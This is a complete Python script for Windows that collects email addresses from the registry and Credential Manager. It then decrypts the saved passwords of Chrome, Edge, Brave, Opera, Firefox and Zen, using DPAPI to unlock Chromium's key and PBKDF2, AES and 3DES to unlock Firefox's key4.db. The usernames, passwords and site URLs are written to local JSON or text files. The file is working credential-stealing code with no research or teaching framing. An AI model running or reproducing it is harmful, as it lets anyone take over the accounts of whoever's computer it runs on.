from enum import Enum
import sys
import re
import os
import json
import sqlite3
from base64 import b64decode
# Windows registry
import winreg
# Windows credentials
import win32cred      # pywin32
import win32timezone  # pywin32
# Chrome & Firefox passwords
import win32crypt     # pywin32
from Crypto.Cipher import DES3, AES
from Crypto.Util.Padding import unpad
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Hash import SHA256
from hashlib import sha1
from pyasn1.codec.der.decoder import decode
from pyasn1.type.univ import Sequence



#   /$$$$$$  /$$           /$$                 /$$
#  /$$__  $$| $$          | $$                | $$
# | $$  \__/| $$  /$$$$$$ | $$$$$$$   /$$$$$$ | $$
# | $$ /$$$$| $$ /$$__  $$| $$__  $$ |____  $$| $$
# | $$|_  $$| $$| $$  \ $$| $$  \ $$  /$$$$$$$| $$
# | $$  \ $$| $$| $$  | $$| $$  | $$ /$$__  $$| $$
# |  $$$$$$/| $$|  $$$$$$/| $$$$$$$/|  $$$$$$$| $$
#  \______/ |__/ \______/ |_______/  \_______/|__/

# Settings
class Target(Enum):
  Mails = 0      # Mails
  Accounts = 1   # Usernames & passwords

class SaveAs(Enum):
  JSON = 0
  Text = 1

class Settings:
  targets = [ Target.Mails, Target.Accounts ]
  save = SaveAs.JSON

def searching(search):
  return search in Settings.targets

# Info & settings
class Info:
  mails = {}
  accounts = []



#  /$$   /$$   /$$     /$$ /$$
# | $$  | $$  | $$    |__/| $$
# | $$  | $$ /$$$$$$   /$$| $$
# | $$  | $$|_  $$_/  | $$| $$
# | $$  | $$  | $$    | $$| $$
# | $$  | $$  | $$ /$$| $$| $$
# |  $$$$$$/  |  $$$$/| $$| $$
#  \______/    \___/  |__/|__/

def readJSON(path):
  try:
    with open(path) as f: 
      return json.load(f), None
  except Exception as e:
    return '', e

def log(mode, info):
  print(mode + ': ' + info)



#   /$$$$$$                                                      /$$
#  /$$__  $$                                                    | $$
# | $$  \ $$  /$$$$$$$  /$$$$$$$  /$$$$$$  /$$   /$$ /$$$$$$$  /$$$$$$   /$$$$$$$
# | $$$$$$$$ /$$_____/ /$$_____/ /$$__  $$| $$  | $$| $$__  $$|_  $$_/  /$$_____/
# | $$__  $$| $$      | $$      | $$  \ $$| $$  | $$| $$  \ $$  | $$   |  $$$$$$
# | $$  | $$| $$      | $$      | $$  | $$| $$  | $$| $$  | $$  | $$ /$$\____  $$
# | $$  | $$|  $$$$$$$|  $$$$$$$|  $$$$$$/|  $$$$$$/| $$  | $$  |  $$$$//$$$$$$$/
# |__/  |__/ \_______/ \_______/ \______/  \______/ |__/  |__/   \___/ |_______/

# Helpers
def addAccount(url, username, password):
  # Fix data
  url = str(url).replace('\r', '')
  username = str(username).replace('\r', '')
  password = str(password).replace('\r', '')

  # No user or password
  if username == '' or password == '': return

  # Add to list
  Info.accounts.append({
    'url': url,
    'username': username,
    'password': password
  })

# Search functions
def searchChromium():
  # What are we searching for? mails, accounts or both
  if searching(Target.Mails): 
    if searching(Target.Accounts):
      print('Searching chromium browsers for mails and accounts...')
    else:
      print('Searching chromium browsers for mails...')
  elif searching(Target.Accounts):
    print('Searching chromium browsers for accounts...')
  else:
    return
  
  # Get appdata folders
  local = os.getenv('LOCALAPPDATA')
  roaming = os.getenv('APPDATA')

  # Add mails from all known chromium browsers
  searchChromiumFromPath(local + '\\Google\\Chrome\\User Data\\')
  searchChromiumFromPath(local + '\\Microsoft\\Edge\\User Data\\')
  searchChromiumFromPath(local + '\\BraveSoftware\\Brave-Browser\\User Data\\')
  searchChromiumFromPath(roaming + '\\Opera Software\\Opera Stable\\User Data\\')
  searchChromiumFromPath(roaming + '\\Opera Software\\Opera GX Stable\\User Data\\')

def searchChromiumFromPath(path):
  # Check if Local State file exists
  localStatePath = path + 'Local State'
  if not os.path.exists(localStatePath): return

  # Read Local State file
  localState, e = readJSON(localStatePath)
  if e != None:
    log('Chromium', f'error reading Local State: {e}')
    return

  # Get profile names & data from Local State
  if not 'profile' in localState: 
    log('Chromium', 'missing profile key in Local State')
    return
  profile = localState['profile']
  if not 'profiles_order' in profile: 
    log('Chromium', 'missing profiles_order key in profile')
    return
  profileNames = profile['profiles_order']
  if not 'info_cache' in profile: 
    log('Chromium', 'missing info_cache key in profile')
    return
  profilesData = profile['info_cache']

  # 
  # Find secret key to decrypt passwords
  # 

  secretKey = None
  if (searching(Target.Accounts)):
    try:
      # Get secret key from local state & decode it
      secretKey = localState['os_crypt']['encrypted_key']
      secretKey = b64decode(secretKey)

      # Remove DPAPI suffix
      secretKey = secretKey[5:]

      # Decrypt secret key
      secretKey = win32crypt.CryptUnprotectData(secretKey, None, None, None, 0)[1]
    except Exception as e:
      # Error
      log('Chromium', f'error finding encryption key: {e}')
  
  # 
  # Check all profiles
  # 

  for name in profileNames:
    # Get profile data
    profileData = profilesData[name]

    # Get profile user name (mail)
    if searching(Target.Mails) and 'user_name' in profileData: 
      addMail(profileData['user_name'])

    # Get profile folder
    profileFolder = path + name + '\\'

    # 
    # Read Preferences file
    # 

    # Searching for mails -> Read Preferences file
    if (searching(Target.Mails)):
      try:
        # Read file
        preferences, e = readJSON(profileFolder + 'Preferences')
        if e != None:
          log('Chromium', f'error reading Preferences: {e}')
        else:
          # Get accounts info
          if 'account_info' in preferences: 
            accounts = preferences['account_info']

            # Find mails in accounts
            for account in accounts:
              if 'email' in account:
                addMail(account['email'])
      except Exception as e:
        # Error
        log('Chromium', f'error reading Preferences: {e}')

    # 
    # Read Login Data file
    # 

    try:
      # Connect to database
      connection = sqlite3.connect(f'file:{profileFolder}Login Data?mode=ro&immutable=1', uri = True)
      cursor = connection.cursor()

      # Select logins
      cursor.execute('SELECT action_url, username_value, password_value FROM logins')
      
      # Save accounts information
      for row in cursor.fetchall():
        # Save mail
        if (searching(Target.Mails)):
          addMail(row[1])

        # Save account
        if searching(Target.Accounts) and secretKey is not None:
          # Get ciphertext
          ciphertext = row[2]

          # Extract initialisation vector & encrypted password from ciphertext
          initialisationVector = ciphertext[3:15]
          encryptedPassword = ciphertext[15:-16]

          # Build the AES algorithm to decrypt the password
          cipher = AES.new(secretKey, AES.MODE_GCM, initialisationVector)

          # Decrypt password and save account
          addAccount(row[0], row[1], cipher.decrypt(encryptedPassword).decode())

      # Close database
      connection.close()
    except Exception as e:
      log('Chromium', f'error reading Login Data: {e}')

def searchFirefox():
  # What are we searching for? mails, accounts or both
  if searching(Target.Mails): 
    if searching(Target.Accounts):
      print('Searching firefox browsers for mails and accounts...')
    else:
      print('Searching firefox browsers for mails...')
  elif searching(Target.Accounts):
    print('Searching firefox browsers for accounts...')
  else:
    return
  
  # Get appdata folders
  roaming = os.getenv('APPDATA')

  # Add mails from all known firefox browsers
  searchFirefoxFromPath(roaming + '\\zen\\Profiles\\')
  searchFirefoxFromPath(roaming + '\\Mozilla\\Firefox\\Profiles\\')

def searchFirefoxFromPath(path):
  # Check if browser path exists
  if not os.path.exists(path): return

  # Check all profiles
  profiles = next(os.walk(path))[1]
  for profile in profiles:
    # 
    # Find global decryption key
    # 

    # Check if key4.db exists
    keyPath = os.path.join(path, profile, 'key4.db')
    if not os.path.exists(keyPath): 
      log('Firefox', 'key4.db does not exist')
      continue

    # Connect to the key4.db database
    connection = sqlite3.connect(f'file:{keyPath}?mode=ro&immutable=1', uri = True)
    cursor = connection.cursor()

    # Get the global salt
    cursor.execute('SELECT item1 FROM metaData WHERE id = "password"')
    globalSalt = cursor.fetchone()[0]

    # Get the encoded a11 data
    cursor.execute("SELECT a11, a102 FROM nssPrivate")
    a11, ckaIdValue = cursor.fetchone()

    # Check if algorithm is supported
    ckaId = bytes([248, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1])
    if ckaIdValue != ckaId:
      log('Firefox', 'ckaIdValue does not match ckaId')
      continue

    # Decode A11 data
    decodedA11, e = decode(a11, asn1Spec=Sequence())

    # Check if algorithm is suported
    clearText = None
    if str(decodedA11[0][0]) == '1.2.840.113549.1.5.13':
      # Algorithm is supported -> Get hashed salt and params
      hashedSalt = sha1(globalSalt).digest()
      params = decodedA11[0][1][0][1]

      # Generate PBKDF2 key
      salt = bytes(params[0])
      iterations = params[1]
      length = params[2]
      key = PBKDF2(hashedSalt, salt, dkLen=length, count=iterations, hmac_hash_module=SHA256)

      # 
      iv = bytes([0x04, 0x0E]) + bytes(decodedA11[0][1][1][1])
      ciphertext = bytes(decodedA11[1])

      # Decrypt AES
      cipher = AES.new(key, AES.MODE_CBC, iv)
      decrypted = cipher.decrypt(ciphertext)
      clearText = unpad(decrypted, AES.block_size)
    else:
      # Algorithm not supported
      log('Firefox', 'unsupported algorithm')
      continue
    
    # Get key from clear text
    key = clearText[:24]

    # Close database connection
    connection.close()

    # 
    # Read logins and decrypt them
    # 

    # Check if logins.json exists
    loginsPath = path + profile + '\\logins.json'
    if not os.path.exists(loginsPath): 
      log('Firefox', 'logins.json does not exist')
      continue

    # Read logins file
    logins, e = readJSON(loginsPath)
    if e != None:
      log('Firefox', f'error reading logins.json: {e}')
      continue
    
    # Get logins from logins file
    if not 'logins' in logins: 
      log('Firefox', 'missing logins key in logins.json')
      continue
    logins = logins['logins']

    # Get all usernames and passwords
    for login in logins:
      # Get username (probably a mail)
      username = firefoxDecryptPassword(login['encryptedUsername'], key, ckaId)
      if searching(Target.Mails): 
        addMail(username)
      
      # Get password (if looking for accounts)
      if not searching(Target.Accounts):
        continue
      password = firefoxDecryptPassword(login['encryptedPassword'], key, ckaId)
      addAccount(login['hostname'], username, password)

def firefoxDecryptPassword(encryptedDataBase64, key, ckaId):
  # Decode Base64 to raw bytes
  encryptedData = b64decode(encryptedDataBase64)
  
  # Decode ASN1 Data
  ASN1Data, _ = decode(encryptedData, asn1Spec=Sequence())

  # Parse keyId, initialization vector & ciphertext
  keyId = bytes(ASN1Data[0])
  iv = bytes(ASN1Data[1][1])
  ciphertext = bytes(ASN1Data[2])
  
  # Check if keyId matches ckaID
  if keyId != ckaId:
    log('Firefox', 'keyId does not match ckaId')
    return ''
  
  # Decipher passwords
  cipher = DES3.new(key, DES3.MODE_CBC, iv)
  decrypted = cipher.decrypt(ciphertext)
  return unpad(decrypted, DES3.block_size).decode("utf-8")



#  /$$      /$$           /$$ /$$
# | $$$    /$$$          |__/| $$
# | $$$$  /$$$$  /$$$$$$  /$$| $$  /$$$$$$$
# | $$ $$/$$ $$ |____  $$| $$| $$ /$$_____/
# | $$  $$$| $$  /$$$$$$$| $$| $$|  $$$$$$
# | $$\  $ | $$ /$$__  $$| $$| $$ \____  $$
# | $$ \/  | $$|  $$$$$$$| $$| $$ /$$$$$$$/
# |__/     |__/ \_______/|__/|__/|_______/

# Helpers
def addMail(mail):
  # Fix data
  mail = str(mail).replace('\r', '')

  # Not a mail -> Return
  if (not isMail(mail)):
    return
  
  # Add to dictionary
  if mail in Info.mails:
    Info.mails[mail] += 1
  else:
    Info.mails[mail] = 1

def isMail(mail):
  pattern = re.compile(r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$")
  return pattern.match(str(mail))

# Search functions
def searchMailInRegistry():
  # Not searching for mails
  if not searching(Target.Mails): return

  # Current method
  print('Searching registry for mails...')

  # Search the key path subkeys
  try:
    # Open the registry key
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\IdentityCRL\\UserExtendedProperties', 0, winreg.KEY_READ)
    
    # Add all folders to list
    i = 0
    while True:
      try:
        # Get next subkey & save it
        addMail(winreg.EnumKey(key, i))
        i += 1
      except OSError:
        # No more subkeys
        break

    # Close the registry key
    winreg.CloseKey(key)

  except FileNotFoundError:
    # Key does not exist
    log('Registry', 'registry does not exist')

  except PermissionError:
    # Missing permissions to read the key
    log('Registry', 'missing permissions to read the key')

def searchMailInCredentials():
  # Not searching for mails
  if not searching(Target.Mails): return

  # Current method
  print('Searching Windows credentials for mails...')

  # Look for mails in Windows credentials
  try:
    # Get all credentials
    credentials = win32cred.CredEnumerate(None, 0)
    
    # Check credentials for mails
    for cred in credentials:
      addMail(cred.get('UserName', 'N/A'))
  
  except Exception as e:
    # Error
    log('Credentials', f'error while reading credentials: {e}')



#  /$$      /$$           /$$          
# | $$$    /$$$          |__/          
# | $$$$  /$$$$  /$$$$$$  /$$ /$$$$$$$ 
# | $$ $$/$$ $$ |____  $$| $$| $$__  $$
# | $$  $$$| $$  /$$$$$$$| $$| $$  \ $$
# | $$\  $ | $$ /$$__  $$| $$| $$  | $$
# | $$ \/  | $$|  $$$$$$$| $$| $$  | $$
# |__/     |__/ \_______/|__/|__/  |__/

# Check arguments
for i, arg in enumerate(sys.argv):
  # Ignore first argument (is the file's path)
  if (i == 0): continue

  # Check if argument is to change a var
  if (not re.compile(r".+=.+").match(arg)): continue

  # Get variable & value
  parts = arg.split('=')
  var = parts[0]
  val = parts[1]

  # Check settings to change
  match var:
    # Target information
    case 't' | 'target' | 'targets':
      Settings.targets = []
      for target in val.split(','):
        match target.lower():
          case 'm' | 'mail' | 'mails':
            Settings.targets.append(Target.Mails)
          case 'a' | 'account' | 'accounts':
            Settings.targets.append(Target.Accounts)

    # Save format
    case 's' | 'save':
      match val.lower():
        case 't' | 'text' | 'txt':
          Settings.save = SaveAs.Text
        case 'j' | 'json' | _:
          Settings.save = SaveAs.JSON

# Search info
print('\n** SEARCHING FOR INFORMATION')
searchMailInRegistry()
searchMailInCredentials()
searchChromium()
searchFirefox()

# Save info to file
print('\n** SAVING INFORMATION')
match Settings.save:
  # Save as JSON
  case SaveAs.JSON:
    # Mails
    if (searching(Target.Mails)):
      print('Saving mails in mails.json')

      # Save file
      file = open('mails.json', 'w')
      json.dump(Info.mails, file)
      file.close()

    # Accounts
    if (searching(Target.Accounts)):
      print('Saving accounts in accounts.json')

      # Save file
      file = open('accounts.json', 'w')
      json.dump(Info.accounts, file)
      file.close()
    
  # Save as TXT
  case SaveAs.Text:
    # Mails
    if (searching(Target.Mails)):
      print('Saving mails in mails.txt')

      # Save file
      file = open('mails.txt', 'w')
      for i, mail in enumerate(Info.mails):
        file.write(mail + '\t' + str(Info.mails[mail]))
        if (i < len(Info.mails) - 1): 
          file.write('\n')
      file.close()
    
    # Accounts
    if (searching(Target.Accounts)):
      print('Saving accounts in accounts.txt')

      # Save file
      file = open('accounts.txt', 'w')
      for i, account in enumerate(Info.accounts):
        file.write(account['username'] + '\t' + account['password'] + '\t' + account['url'])
        if (i < len(Info.accounts) - 1): 
          file.write('\n')
      file.close()